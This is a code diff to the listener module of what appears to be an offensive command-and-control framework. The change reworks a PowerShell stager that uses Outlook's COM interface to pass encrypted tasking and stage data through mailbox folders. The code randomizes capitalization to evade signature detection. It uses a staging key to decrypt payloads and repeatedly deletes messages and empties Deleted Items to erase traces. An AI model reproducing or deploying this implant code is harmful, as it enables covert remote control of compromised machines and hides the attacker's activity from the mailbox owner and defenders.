@@ -179,15 +179,15 @@ class Listener:
                     stager += "$outlook = New-Object -comobject Outlook.Application;"
                     stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
                     stager += 'MAPI");'
-
+                    if listenerOptions['Email']['Value'] != '':
+                        stager += '$fld = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(2).Folders.Item("'+listenerOptions['Folder']['Value']+'")};'
+                        stager += '$fldel = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(3)};'
+                    else:
+                        stager += '$fld = $outlook.Session.GetDefaultFolder(6).Folders.Item("'+listenerOptions['Folder']['Value']+'");'
+                        stager += '$fldel = $outlook.Session.GetDefaultFolder(3);'
                 # clear out all existing mails/messages
 
-                stager += helpers.randomize_capitalization("while(($outlook.Session.GetDefaultFolder(6).Folders.Item('")
-                stager += listenerOptions['Folder']['Value']
-                stager += helpers.randomize_capitalization("').Items | measure | %{$_.Count}) -gt 0 ){ $outlook.Session.GetDefaultFolder(6).Folders.Item('")
-                stager += listenerOptions['Folder']['Value']
-                stager += helpers.randomize_capitalization("').Items | %{$_.delete()};}")
-
+                stager += helpers.randomize_capitalization("while(($fld.Items | measure | %{$_.Count}) -gt 0 ){ $fld.Items | %{$_.delete()};}")
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
@@ -205,17 +205,11 @@ class Listener:
                 stager += helpers.randomize_capitalization('$mail.Body = ')
                 stager += '"STAGE - %s"' % b64RoutingPacket
                 stager += helpers.randomize_capitalization(';$mail.save() | out-null;')
-                stager += helpers.randomize_capitalization("$mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('")
-                stager += listenerOptions['Folder']['Value']
-                stager += helpers.randomize_capitalization('\'))| out-null;')
+                stager += helpers.randomize_capitalization('$mail.Move($fld)| out-null;')
                 stager += helpers.randomize_capitalization('$break = $False; $data = "";')
                 stager += helpers.randomize_capitalization("While ($break -ne $True){")
-                stager += helpers.randomize_capitalization('$outlook.Session.GetDefaultFolder(6).Folders.Item("')
-                stager += listenerOptions['Folder']['Value']
-                stager += helpers.randomize_capitalization('").Items | Where-Object {$_.Subject -eq "mailpirein"} | %{$_.HTMLBody | out-null} ;')
-                stager += helpers.randomize_capitalization('$outlook.Session.GetDefaultFolder(6).Folders.Item("')
-                stager += listenerOptions['Folder']['Value']
-                stager += helpers.randomize_capitalization('").Items | Where-Object {$_.Subject -eq "mailpirein" -and $_.DownloadState -eq 1} | %{$break=$True; $data=[System.Convert]::FromBase64String($_.Body);$_.Delete();};}')
+                stager += helpers.randomize_capitalization('$fld.Items | Where-Object {$_.Subject -eq "mailpirein"} | %{$_.HTMLBody | out-null} ;')
+                stager += helpers.randomize_capitalization('$fld.Items | Where-Object {$_.Subject -eq "mailpirein" -and $_.DownloadState -eq 1} | %{$break=$True; $data=[System.Convert]::FromBase64String($_.Body);$_.Delete();};}')
 
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
@@ -249,7 +243,7 @@ class Listener:
         stagingKey = listenerOptions['StagingKey']['Value']
         host = listenerOptions['Host']['Value']
         folder = listenerOptions['Folder']['Value']
-        
+
         if language.lower() == 'powershell':
 
             # read in the stager base
@@ -370,14 +364,14 @@ class Listener:
                                 $mail.Subject = "mailpireout";
                                 $mail.Body = "GET - "+$RoutingCookie+" - "+$taskURI;
                                 $mail.save() | out-null;
-                                $mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER'))| out-null;
+                                $mail.Move($fld)| out-null;
 
                                 # keep checking to see if there is response
                                 $break = $False;
                                 [byte[]]$b = @();
 
                                 While ($break -ne $True){
-                                  foreach ($item in $outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER').Items) {
+                                  foreach ($item in $fld.Items) {
                                     if($item.Subject -eq "mailpirein"){
                                       $item.HTMLBody | out-null;
                                       if($item.Body[$item.Body.Length-1] -ne '-'){
@@ -396,7 +390,7 @@ class Listener:
                         catch {
 
                         }
-                        while(($outlook.Session.GetDefaultFolder(3).Items | measure | %{$_.Count}) -gt 0 ){ $outlook.Session.GetDefaultFolder(3).Items | %{$_.delete()};} 
+                        while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
                     }
                 """
 
@@ -420,11 +414,11 @@ class Listener:
                                     $mail.Subject = "mailpireout";
                                     $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp;
                                     $mail.save() | out-null;
-                                    $mail.Move($outlook.Session.GetDefaultFolder(6).Folders.Item('REPLACE_FOLDER')) | out-null;
+                                    $mail.Move($fld) | out-null;
                                 }
                                 catch {
                                 }
-                                while(($outlook.Session.GetDefaultFolder(3).Items | measure | %{$_.Count}) -gt 0 ){ $outlook.Session.GetDefaultFolder(3).Items | %{$_.delete()};} 
+                                while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
                         }
                     }
                 """
